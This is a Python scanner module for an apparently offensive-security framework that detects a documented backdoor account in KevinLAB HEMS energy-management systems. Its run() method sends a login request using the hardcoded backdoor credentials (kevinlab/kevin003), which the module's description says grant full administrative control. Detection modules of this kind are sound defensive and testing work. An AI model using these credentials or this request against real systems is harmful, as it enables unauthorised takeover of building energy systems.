#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'KevinLAB HEMS - Backdoor Detection',
        'description': 'KevinLAB HEMS has an undocumented backdoor account and these sets of credentials are never exposed to the end-user and cannot be changed through any normal operation of the solution through the RMI. An attacker could exploit this vulnerability by logging in using the backdoor account with highest privileges for administration and gain full system control. The backdoor user cannot be seen in the users settings in the admin panel and it also uses an undocumented privilege level (admin_pk=1) which allows full availability of the features that the HEMS is offering remotely.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'kevinlab', 'default-login', 'backdoor', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5654.php'],
    }

    def run(self):
        path = '/dashboard/proc.php?type=login'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close'}, data='userid=kevinlab&userpass=kevin003\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<meta http-equiv="refresh" content="0; url=/"></meta>', '<script> alert',)
        header_any = ('PHPSESSID',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(severity='critical', reason='KevinLAB HEMS - Backdoor detected', path=path)
            return True
        return False

